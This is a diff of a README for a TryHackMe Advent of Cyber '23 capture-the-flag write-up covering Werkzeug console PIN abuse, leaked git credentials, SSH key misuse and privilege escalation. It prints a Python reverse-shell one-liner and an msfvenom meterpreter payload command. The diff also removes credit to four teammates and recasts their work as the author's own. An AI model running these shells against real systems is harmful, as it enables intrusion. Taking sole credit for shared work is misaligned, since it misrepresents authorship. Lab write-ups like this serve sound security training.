@@ -1,7 +1,5 @@
 # The Bandit Surfer (THM Advent of Cyber '23 Side Quest 4 Difficulty: Hard)
 
-This was a team effort with 4 other THM Discord members. 
-
 ## Finding the QR Code
 
 To find the QR code that leads to this challenge you need to complete the task in Day 20 (DevSecOps Advent of Frostlings) of [THM Advent of Cyber '23](https://tryhackme.com/room/adventofcyber2023). 
@@ -54,7 +52,7 @@ We only have 2 ports to check out and there's not enough info to get into SSH on
 
 We find a website with 3 elf images you can download by clicking on them. I downloaded them all and used the typical stego tools to see if there was anything hidden inside. Nothing.
 
-Using gobuster we find 2 directories to explore.
+Using gobuster I find 2 directories to explore.
 
 ```
 Gobuster dir -u http://rh:8000/ -w /usr/share/wordlists/gobuster/common.txt  
@@ -97,7 +95,7 @@ Any other number brings us to an error page that has some interesting informatio
   <img height=400 img src=./readme_assets/error-page.PNG/>
 </p>
 
-Researching Werkzeug/3.0.0 Python/3.8.10 we found a [Console PIN Exploit](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/) that looked promising. 
+Researching Werkzeug/3.0.0 Python/3.8.10 I found a [Console PIN Exploit](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/) that looked promising. 
 
 To use the exploit you need the following information:
 ```
@@ -194,7 +192,7 @@ Once you enter the correct pin you will have access to the interactive console.
   <img height=300 img src=./readme_assets/interactive.PNG/>
 </p>
 
-The goal now is to get a reverse shell. We used [revshells.com](https://www.revshells.com/) to help generate the code needed for the console.
+The goal now is to get a reverse shell. I used [revshells.com](https://www.revshells.com/) to help generate the code needed for the console.
 
 ```
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURVMIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
@@ -250,9 +248,9 @@ app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)
 ```
 
-Looking further through the mcskidy directory we find /mcskidy/app/.git which gives us some very usefull info.
+Looking further through the mcskidy directory I found /mcskidy/app/.git which gave me some very usefull info.
 
-Use `git log` to to show all of the commits.
+Use `git log` to show all of the commits.
 
 ```
 commit c23b1ae2d5c55dd73f26c2176c0d460e964f8b7b (HEAD -> master)
@@ -324,7 +322,7 @@ index 8d05622..5765c7d 100644
  mysql = MySQL(app)
  ```
  
-We also found the mysql root password:
+I also found the mysql root password:
 ```
 commit 81fd2d250483a542bc5c50f9433c9d5188115022
 
@@ -336,7 +334,7 @@ app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)
 ```
 
-A team member figure out how to log into ssh using this [resource](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/).
+I figured out how to log into ssh using this [resource](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/).
 ```
 On your VM:
 ssh-keygen  
@@ -348,7 +346,7 @@ ssh mcskidy@BOX_IP
 ```
 This opens up port 8000 for experimenting.
 
-We spent days combing through every file and trying any privsec technique we came across with no success at getting root. 2 files we found seemed like the pathway but we were having trouble figuring out how to use them.
+I spent days combing through every file and trying any privsec technique I came across with no success at getting root. 2 files I found seemed like the pathway but was having trouble figuring out how to use them.
 
 /opt/check.sh
 /opt/.bashrc
@@ -383,7 +381,7 @@ If you type `enable` into the terminal it lists the available options, and `[` i
 
 `[` is part of the shell that can be enabled and disabled. The rest `# ]` is not and is ignored by the `enable -n [ # ]` command. So, we just need to focus on the  `[`
 
-We spent hours trying everything we could think of until a team member finally figured out how to root the box.
+I spent hours trying everything we could think of until finally figuring out how to root the box.
 
 Create a reverse shell in Meterpreter 
 `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURVPNIP LPORT=4445 -f elf -o payload2.elf`
